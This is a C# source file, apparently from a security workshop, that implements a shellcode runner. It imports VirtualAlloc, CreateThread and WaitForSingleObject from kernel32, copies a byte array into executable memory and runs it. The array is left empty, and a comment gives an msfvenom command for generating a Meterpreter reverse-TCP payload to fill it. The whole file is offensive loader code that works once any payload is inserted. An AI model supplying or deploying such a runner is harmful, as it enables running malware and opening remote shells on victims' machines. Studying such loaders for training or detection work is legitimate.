using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;

namespace ozsec2021_shellcode
{
    class Original
    {
        // Set the memory to commit and rx 
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        // create VirtualAlloc(), CreateThread() and WaitForSingleObject() references through DLLImport of 'kernel32' package
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
                UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
            );
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );
        // everything in Main() will fire code at launch
        public static void BadMain(string[] args)
        {
            // create and set the shellcode byte[] and feed it byte[] of shellcode or other payloads: Generated via msfvenom
            // Ex: msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=1337 -f csharp 
            byte[] shellcode = new byte[] { /* Shellcode byte[] here. Ex ' 0x00,0x0F,0x0c ' */ };
            // Allocate the virtual memory and copy in shell code, address and length
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            // set the pointer of thread
            IntPtr hThread = IntPtr.Zero;
            // hold thread's id
            UInt32 threadId = 0;
            // store process info point
            IntPtr pinfo = IntPtr.Zero;
            // Create the thread - Passing in TheadAttributes, Stack Size, Address, process info, creation flags and thread Id
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);


            Console.WriteLine($"Press anything to exit ...");
            Console.ReadKey();
        }
    }
}
